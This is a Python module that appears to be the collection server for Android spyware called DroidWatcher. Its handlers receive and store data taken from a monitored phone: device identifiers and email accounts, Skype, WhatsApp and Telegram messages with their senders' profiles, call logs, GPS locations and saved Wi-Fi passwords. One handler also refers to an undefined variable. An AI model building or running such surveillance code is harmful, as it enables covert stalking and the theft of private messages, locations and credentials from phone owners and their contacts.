import datetime
import traceback
import unicodedata

import sqlalchemy

from curiosus import db
from curiosus.models import (ActionLog, Device, Location, SkypeAuthor,
                             SkypeMessage, TelegramAuthor, TelegramMessage,
                             WhatsAppAuthor, WhatsAppMessage, WirelessPassword)


def timestamp_to_date(timestamp, miliseconds=True, **kwargs):
    try:
        date = datetime.datetime.fromtimestamp(int(timestamp))
    except:
        date = datetime.datetime.fromtimestamp(int(timestamp) / 1000.0)
    return date


def log(module, date, msg):
    date = timestamp_to_date(date)
    print('[{module}] [{date}] {msg}'.format(module=module, date=date, msg=msg))


def get_or_set_device(imei):
    d = Device.query.filter_by(imei=imei).first()

    if d:
        return d

    else:
        d = Device(imei=imei)
        db.session.add(d)
        db.session.commit()

        return d


def handle_device_info(body):
    now = datetime.datetime.now()

    print("*** DEVICE INFO ***")
    print("Serial: {}".format(body['serial']))
    print("Brand: {}".format(body['brand']))
    print("Model: {}".format(body['model']))
    print("IMEI: {}".format(body['imei']))
    print("Number: {}".format(body['number']))
    print("Android Version: {}".format(body['os']))
    print("Email List: {}".format(', '.join(list(set(body['email_list'].split('|')))).lstrip(', ')))
    print("DroidWatcher Version: {}".format(body['ver']))
    print("Root: {}".format(body['root']))

    d = Device.query.filter_by(imei=body['imei']).first()

    if d:
        d.brand = body['brand']
        d.model = body['model']
        d.serial = body['serial']
        d.imei = body['imei']
        d.android_version = body['os']
        d.email_list = ', '.join(list(set(body['email_list'].split('|')))).lstrip(', ')
        d.droidwatcher_version = body['ver']
        d.root = body['root']
        d.number = body['number']
    else:
        d = Device(serial=body['serial'], brand=body['brand'], model=body['model'], imei=body['imei'], number=body['number'], android_version=body['os'], email_list=body['email_list'], droidwatcher_version=body['ver'], root=body['root'])
    try:
        db.session.merge(d)
        db.session.commit()
    except Exception as e:
        traceback.print_exc()

    l = ActionLog(date=now, table='Device', device_imei=d.imei, message='Device Reported')
    db.session.add(l)
    db.session.commit()


def handle_skype(body):
    for message in body['body']:
        now = datetime.datetime.now()
        print('*** SKYPE MESSAGE ***')
        print('Name: {} ({})'.format(message['author']['fullname'], message['author']['username']))
        print('Date: {}'.format(timestamp_to_date(message['date'])))
        print('Text: {}'.format(message['text']))
        print()
        d = get_or_set_device(body['imei'])

        aobj = message['author']

        a = SkypeAuthor.query.filter_by(username=aobj['username']).first()

        new_author = False

        if not a:
            new_author = True
            a = SkypeAuthor(username=aobj['username'], fullname=aobj['fullname'], country=aobj['country'], birthday=aobj['birthday'], gender=aobj['gender'], province=aobj['province'], city=aobj['city'], phone=aobj['phone'], homepage=aobj['homepage'], about=aobj['about'], mood=aobj['mood'], external_id=aobj['uid'])

        try:
            db.session.merge(a)
            db.session.commit()

            if new_author:
                l = ActionLog(date=now, table='SkypeAuthor', device_imei=d.imei, message='Skype Author')
                db.session.add(l)
                db.session.commit()
        except Exception as e:
            traceback.print_exc()

        a = SkypeAuthor.query.filter_by(username=aobj['username']).first()

        if a:
            m = SkypeMessage(author_id=a.username, date=timestamp_to_date(message['date']), text=message['text'], message_type=message['type'], extra=message['extra'], external_id=message['external_id'], latitude=message['lat'], longitude=lat['lon'], device_imei=d.imei)

            try:
                db.session.add(m)
                db.session.commit()

                l = ActionLog(date=now, table='SkypeMessage', device_imei=d.imei, message='Skype Message')
                db.session.add(l)
                db.session.commit()
            except Exception as e:
                traceback.print_exc()


def handle_whatsapp(body):
    for message in body['body']:
        now = datetime.datetime.now()

        print('*** WHATSAPP MESSAGE ***')
        print('Name: {} ({})'.format(message['author']['fullname'], message['author']['uid']))
        print('Date: {}'.format(timestamp_to_date(message['date'])))
        print('Direction: {}'.format(message['type']))
        print('Text: {}'.format(message['text']))
        print()
        d = get_or_set_device(body['imei'])

        aobj = message['author']

        a = WhatsAppAuthor.query.filter_by(phone=aobj['phone']).first()

        new_author = False

        if not a:
            new_author = True
            a = WhatsAppAuthor(external_id=aobj['uid'], fullname=aobj['fullname'], mood=aobj.get('mood', ''), phone=aobj['phone'])

        try:
            db.session.merge(a)
            db.session.commit()

            if new_author:
                l = ActionLog(date=now, table='WhatsAppAuthor', device_imei=d.imei, message='WhatsApp Author')
                db.session.add(l)
                db.session.commit()
        except Exception as e:
            traceback.print_exc()

        a = WhatsAppAuthor.query.filter_by(phone=aobj['phone']).first()

        if a:
            m = WhatsAppMessage(author_id=a.phone, date=timestamp_to_date(message['date']), text=message['text'], message_type=message['type'], external_id=message['mid'], latitude=message['lat'], longitude=message['lon'], device_imei=d.imei)

            try:
                db.session.add(m)
                db.session.commit()

                l = ActionLog(date=now, table='WhatsAppMessage', device_imei=d.imei, message='WhatsApp Message')
                db.session.add(l)
                db.session.commit()
            except Exception as e:
                traceback.print_exc()


def handle_telegram(body):
    for message in body['body']:
        now = datetime.datetime.now()
        print('*** TELEGRAM MESSAGE ***')
        print('Name: {} ({})'.format(message['author']['fullname'], message['author']['uid']))
        print('Date: {}'.format(timestamp_to_date(message['date'], convert=False)))
        print('Direction: {}'.format(message['type']))
        text = 'W'.join(''.join([chr(x) for x in message['text'].encode('utf-8') if unicodedata.category(chr(x)) != 'Cc']).split('W')[1:])
        text = text.encode('utf-8').decode('utf-8')
        print('Text: {}'.format(text))
        print()
        d = get_or_set_device(body['imei'])

        aobj = message['author']

        a = TelegramAuthor.query.filter_by(external_id=aobj['uid']).first()

        new_author = False

        if not a:
            new_author = True
            a = TelegramAuthor(external_id=aobj['uid'], fullname=aobj['fullname'], extra=aobj['extra'])

        try:
            db.session.merge(a)
            db.session.commit()

            if new_author:
                l = ActionLog(date=now, table='TelegramAuthor', device_imei=d.imei, message='Telegram Author')
                db.session.add(l)
                db.session.commit()
        except Exception as e:
            traceback.print_exc()

        a = TelegramAuthor.query.filter_by(external_id=aobj['uid']).first()

        if a:
            m = TelegramMessage(author_id=a.external_id, date=timestamp_to_date(message['date']), text=text, message_type=message['type'], external_id=message['mid'], latitude=message['lat'], longitude=message['lon'], device_imei=d.imei)

            try:
                db.session.add(m)
                db.session.commit()

                l = ActionLog(date=now, table='TelegramMessage', device_imei=d.imei, message='Telegram Message')
                db.session.add(l)
                db.session.commit()
            except Exception as e:
                traceback.print_exc()


def handle_call(body):
    for message in body['body']:
        now = datetime.datetime.now()

        print('*** CALL ***')
        print('Date: {}'.format(timestamp_to_date(message['date'])))
        print('Name: {}'.format(message['name']))
        print('Number: {}'.format(message['number']))
        try:
            print('Lat/Lon: {}/{}'.format(message['lat'], message['lon']))
        except:
            pass
        print('Duration: {}'.format(message['duration']))
        print()


def handle_location(body):
    for message in body['body']:
        now = datetime.datetime.now()
        print('*** LOCATION ***')
        print('Date: {}'.format(timestamp_to_date(message['date'])))
        print('Lat/Lon: {}/{}'.format(message['lat'], message['lon']))
        print('Battery: {}'.format(message['battery']))
        print('Provider: {}'.format(message['provider']))
        print()

        # log('LOCATION', location['date'], 'LAT/LON: {lat}/{lon} | Battery: {battery}'.format(**location))

        d = get_or_set_device(body['imei'])

        l = Location(date=timestamp_to_date(message['date']), latitude=message['lat'], longitude=message['lon'], battery=message['battery'], provider=message['provider'], device_imei=d.imei)

        try:
            db.session.add(l)
            db.session.commit()

            l = ActionLog(date=now, table='Location', device_imei=d.imei, message='Location')
            db.session.add(l)
            db.session.commit()
        except:
            traceback.print_exc()


def handle_wireless_password(body):
    for message in body['body']:
        now = datetime.datetime.now()
        print('*** WIRELESS PASSWORD ***')
        print('ESSID: {}'.format(message['essid']))
        print('Password: {}'.format(message['password']))
        print('Key Management: {}'.format(message['key_mgmt']))
        print()
        d = get_or_set_device(body['imei'])

        wp = WirelessPassword(device_imei=d.imei, date=message.get('date', datetime.datetime.now()), key_management=message['key_mgmt'], latitude=message['lat'], longitude=message['lon'], essid=message['essid'], password=message['password'])
        try:
            db.session.merge(wp)
            db.session.commit()
        except sqlalchemy.exc.IntegrityError:
            db.session.rollback()

        try:

            l = ActionLog(date=now, table='WirelessPassword', device_imei=d.imei, message='Wireless Password')
            db.session.add(l)
            db.session.commit()
        except:
            traceback.print_exc()
